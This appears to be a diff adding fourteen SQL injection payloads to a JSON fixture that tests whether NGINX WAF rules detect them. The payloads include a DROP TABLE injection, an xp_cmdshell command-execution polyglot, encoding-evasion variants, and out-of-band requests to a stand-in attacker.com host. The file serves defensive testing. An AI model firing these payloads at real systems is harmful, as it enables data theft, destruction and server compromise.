@@ -1,7 +1,7 @@
 {
   "metadata": {
     "category": "sqli",
-    "total_patterns": 124,
+    "total_patterns": 138,
     "port": 8001,
     "description": "k6 test patterns for sqli"
   },
@@ -1493,6 +1493,174 @@
       "expected_detection": true,
       "severity": "high",
       "expected_rule": "[NGINX SQLi] Boolean-based Blind SQL Injection"
+    },
+    {
+      "id": "SQLI_2ND_006",
+      "name": "Second order via stored name",
+      "category": "sqli",
+      "subcategory": "second_order",
+      "payload": "admin'--",
+      "encoded": "admin%27--",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
+    },
+    {
+      "id": "SQLI_2ND_007",
+      "name": "Second order via email field",
+      "category": "sqli",
+      "subcategory": "second_order",
+      "payload": "test@x.com' OR '1'='1",
+      "encoded": "test%40x.com%27%20OR%20%271%27%3D%271",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
+    },
+    {
+      "id": "SQLI_2ND_008",
+      "name": "Second order via address field",
+      "category": "sqli",
+      "subcategory": "second_order",
+      "payload": "123 Main St'; DROP TABLE--",
+      "encoded": "123%20Main%20St%27%3B%20DROP%20TABLE--",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
+    },
+    {
+      "id": "SQLI_POLY_005",
+      "name": "SQL/XSS polyglot",
+      "category": "sqli",
+      "subcategory": "polyglot",
+      "payload": "'\"><script>alert(1)</script>-- -",
+      "encoded": "%27%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E--%20-",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
+    },
+    {
+      "id": "SQLI_POLY_006",
+      "name": "SQL/CMDi polyglot",
+      "category": "sqli",
+      "subcategory": "polyglot",
+      "payload": "'; exec xp_cmdshell('whoami')--",
+      "encoded": "%27%3B%20exec%20xp_cmdshell%28%27whoami%27%29--",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
+    },
+    {
+      "id": "SQLI_POLY_007",
+      "name": "JSON injection in SQL context",
+      "category": "sqli",
+      "subcategory": "json_injection",
+      "payload": "{\"$gt\":\"\"},{\"\\$ne\":\"\"}",
+      "encoded": "%7B%22%24gt%22%3A%22%22%7D%2C%7B%22%24ne%22%3A%22%22%7D",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
+    },
+    {
+      "id": "SQLI_BIT_002",
+      "name": "Bitwise AND injection",
+      "category": "sqli",
+      "subcategory": "bitwise_injection",
+      "payload": "1 & 1",
+      "encoded": "1%20%26%201",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "medium",
+      "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
+    },
+    {
+      "id": "SQLI_BIT_003",
+      "name": "Bitwise OR injection",
+      "category": "sqli",
+      "subcategory": "bitwise_injection",
+      "payload": "1 | 1",
+      "encoded": "1%20%7C%201",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "medium",
+      "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
+    },
+    {
+      "id": "SQLI_OOB_004",
+      "name": "Out-of-band via LOAD_FILE",
+      "category": "sqli",
+      "subcategory": "out_of_band",
+      "payload": "LOAD_FILE('\\\\attacker.com\\\\a')",
+      "encoded": "LOAD_FILE%28%27%5C%5Cattacker.com%5C%5Ca%27%29",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
+    },
+    {
+      "id": "SQLI_OOB_005",
+      "name": "Out-of-band via UTL_HTTP",
+      "category": "sqli",
+      "subcategory": "out_of_band",
+      "payload": "UTL_HTTP.REQUEST('http://attacker.com')",
+      "encoded": "UTL_HTTP.REQUEST%28%27http%3A%2F%2Fattacker.com%27%29",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "critical",
+      "expected_rule": "[NGINX SQLi] Advanced SQL Injection Attempt"
+    },
+    {
+      "id": "ENC_SQLI_DBL_001",
+      "name": "Double-encoded UNION SELECT",
+      "category": "sqli",
+      "subcategory": "double_encoded",
+      "payload": "UNION SELECT",
+      "encoded": "%2555NION%2553ELECT",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Encoded SQL Injection Pattern"
+    },
+    {
+      "id": "ENC_SQLI_DBL_002",
+      "name": "Double-encoded OR 1=1",
+      "category": "sqli",
+      "subcategory": "double_encoded",
+      "payload": "' OR 1=1--",
+      "encoded": "%2527%20OR%201%3D1--",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Encoded SQL Injection Pattern"
+    },
+    {
+      "id": "ENC_SQLI_TRP_001",
+      "name": "Triple-encoded OR 1=1",
+      "category": "sqli",
+      "subcategory": "triple_encoded",
+      "payload": "' OR 1=1",
+      "encoded": "%252527%20OR%201%3D1",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Encoded SQL Injection Pattern"
+    },
+    {
+      "id": "ENC_MIX_001",
+      "name": "Mixed encoding UNION SELECT",
+      "category": "sqli",
+      "subcategory": "mixed_encoded",
+      "payload": "' UNION SELECT",
+      "encoded": "%27%20%2555NION%20SELECT",
+      "port": 80,
+      "expected_detection": true,
+      "severity": "high",
+      "expected_rule": "[NGINX SQLi] Encoded SQL Injection Pattern"
     }
   ]
 }
